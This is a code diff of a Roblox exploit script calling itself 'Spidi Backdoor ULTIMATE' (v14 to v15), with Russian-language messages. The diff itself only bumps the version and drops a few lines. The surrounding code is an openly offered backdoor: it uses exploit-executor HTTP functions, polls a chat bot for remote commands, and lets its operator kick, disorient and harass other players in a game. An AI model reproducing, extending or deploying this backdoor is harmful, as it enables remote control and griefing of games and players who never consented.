@@ -25,7 +25,6 @@ local MarketplaceService = game:GetService("MarketplaceService")
 local RunService = game:GetService("RunService")
 local SoundService = game:GetService("SoundService")
 local TweenService = game:GetService("TweenService")
-local UserInputService = game:GetService("UserInputService")
 
 local function httpRequest(url, method, headers, body)
     local f = syn and syn.request or http and http.request or http_request or fluxus and fluxus.request or request
@@ -56,7 +55,6 @@ local function getChatId()
     return false
 end
 
--- ==================== БАЗА ПОЛЬЗОВАТЕЛЕЙ ====================
 local scriptUsers = {}
 local bannedPlayers = {}
 local kickedPlayers = {}
@@ -134,7 +132,6 @@ local function getScriptUserList()
     return list
 end
 
--- ==================== МУЗЫКА ====================
 local function playMusic(target, soundId)
     if not target or not soundId then return end
     local oldSound = target:FindFirstChild("ClientMusic")
@@ -159,7 +156,6 @@ local function stopMusic(target)
     return false
 end
 
--- ==================== КД ====================
 local messageCooldown = {}
 local function canSendMessage(player)
     local userId = player.UserId
@@ -171,7 +167,6 @@ local function canSendMessage(player)
     return true
 end
 
--- ==================== ФУНКЦИИ ====================
 local function desorientPlayer(target)
     local char = target.Character
     if not char then return end
@@ -342,16 +337,16 @@ local function showNotification(target, text, duration)
 end
 
 -- ==================== ОБРАБОТЧИК КОМАНД ====================
-local function handleCommand(cmd, args, username)
+local function handleCommand(cmd, args)
     local info = "👤 Hacker228\n🔗 https://www.roblox.com/games/"..game.PlaceId
     
     if cmd == "start" then
-        sendMessage("✅ Spidi Backdoor ULTIMATE v14 активирован!\n"..info)
+        sendMessage("✅ Spidi Backdoor ULTIMATE v15 активирован!\n"..info)
         return
     end
     
     if cmd == "help" then
-        sendMessage("📋 <b>КОМАНДЫ SPIDI v14:</b>\n\n"..
+        sendMessage("📋 <b>КОМАНДЫ SPIDI v15:</b>\n\n"..
             "<b>👤 ПОЛЬЗОВАТЕЛИ:</b>\n"..
             "/players - список пользователей\n"..
             "/kick [ник/all] [причина] - кикнуть (1 раз)\n"..
@@ -775,7 +770,7 @@ local function pollUpdates()
                     local msg = update.message
                     if not CHAT_ID then
                         CHAT_ID = msg.chat.id
-                        sendMessage("✅ Spidi Backdoor ULTIMATE v14 запущен!\n👤 Hacker228")
+                        sendMessage("✅ Spidi Backdoor ULTIMATE v15 запущен!\n👤 Hacker228")
                     end
                     local text = msg.text
                     if text:sub(1,1) == "/" then
@@ -785,7 +780,7 @@ local function pollUpdates()
                         end
                         local cmd = parts[1]:sub(2):lower()
                         table.remove(parts, 1)
-                        handleCommand(cmd, parts, msg.from.username)
+                        handleCommand(cmd, parts)
                     end
                 end
                 if update.update_id then
@@ -807,5 +802,5 @@ wait(3)
 getChatId()
 
 if CHAT_ID then
-    sendMessage("✅ Spidi Backdoor ULTIMATE v14 запущен!\n👤 Hacker228\n📋 /players - список пользователей\n🎵 /music [ник] [айди] - играть музыку")
+    sendMessage("✅ Spidi Backdoor ULTIMATE v15 запущен!\n👤 Hacker228\n📋 /players - список пользователей\n🎵 /music [ник] [айди] - играть музыку")
 end
